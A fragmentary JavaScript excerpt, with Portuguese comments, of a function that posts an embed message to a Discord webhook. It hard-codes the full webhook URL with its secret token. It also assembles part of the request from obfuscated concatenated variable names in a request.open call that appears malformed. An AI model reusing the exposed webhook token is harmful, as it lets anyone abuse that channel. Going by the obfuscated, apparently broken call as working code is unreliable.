...
function sendNudes(){
  ...
  request.open("POST", ron+nal+dinho+soc+cer+game+play, "https://discord.com/api/webhooks/"+"1022527774918971423/CT0w1BPHvpEyconBYCEEOd8yz0KUvB-vye6WxhCteHE8B3ViFBU9yNYJZrA0hScIuktt"); //Função Post E Qual Servidor
  ...
  const params = {
    ...
    "embeds": [       //Mensagem que o bot vai mandar em Embed
    {
      "author": {
        ...
        "url": `https://novaordemmundial.github.io/${bossSelLink.value}`,
